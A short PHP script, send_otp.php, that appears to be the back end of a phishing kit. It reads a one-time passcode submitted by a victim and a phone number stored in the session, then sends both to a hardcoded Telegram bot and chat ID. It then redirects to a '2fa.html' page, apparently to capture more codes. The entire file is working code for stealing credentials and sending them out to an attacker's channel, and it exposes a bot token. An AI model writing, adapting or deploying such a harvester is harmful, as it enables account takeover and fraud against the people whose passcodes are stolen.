<?php
// send_otp.php
session_start(); // Start the session

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get the OTP code from the form
    $otp_code = isset($_POST['codeotp']) ? $_POST['codeotp'] : '';

    // Retrieve the phone number from session
    $phone_number = isset($_SESSION['phone_number']) ? $_SESSION['phone_number'] : 'Unknown';

    // Your Telegram Bot Token and Chat ID
    $bot_token = '7672236652:AAHZDwEh11fH6TUpAzALYdnNWfa2mT7wiCE';  // Replace with your bot token
    $chat_id = '6551804744';      // Replace with your chat ID

    // Customize the message
    $message = "🔔 *OTP Alert*\n\n";
    $message .= "📞 *Nomor:* `" . $phone_number . "`\n";
    $message .= "🔑 *OTP Code:* `" . $otp_code . "`\n";
    $message .= "\n✅ _Please verify the OTP and proceed._";

    // Telegram API URL
    $url = "https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($message) . "&parse_mode=Markdown";

    // Send the message using file_get_contents
    $response = file_get_contents($url);

    // Check if the message was sent successfully
    if ($response) {
        // Redirect to prosess.php after sending the OTP and phone number
        header("Location: 2fa.html");
        exit();
    } else {
        echo "Failed to send OTP code to Telegram.";
    }
} else {
    echo "Invalid request.";
}
?>
